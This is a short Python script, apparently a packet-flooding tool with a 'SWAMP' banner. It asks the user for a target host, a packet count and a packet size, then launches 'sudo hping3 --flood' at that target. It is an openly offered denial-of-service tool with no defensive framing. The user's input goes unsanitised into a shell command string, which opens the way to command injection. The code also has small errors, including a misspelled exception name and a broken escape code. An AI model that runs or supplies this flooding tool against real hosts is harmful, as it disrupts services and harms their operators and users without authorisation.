import subprocess

def flood_pkt(target_ip, pktnum, pktsize):
    try:
        print("\n\033[36m Begin Packet Flooding...")
        res = subprocess.run(f"sudo hping3 -c {pktnum} -d {pktsize} --flood {target_ip}", shell=True, text=True)
    except KeyboadInterrupt: 
        print("\n\033[31m Process stopped by the user before completion !!!")
    finally:
        print("\n\033[36m Exiting the program")


def collect():
    art = '''
 ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓█████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
                                                                                 

    '''
    print(f"\033[91m{art}\033[0m")
    target_ip = input("\033[36mEnter the target host or ip: ")
    pkt_num = input("\n\033[36m Number of Packets to flood(>50000): ")
    pkt_size = input("\n033[36m Size of Packet(<1500):\033[0m ")
    resp = flood_pkt(target_ip, pkt_num, pkt_size)

if __name__ == '__main__':
    collect()
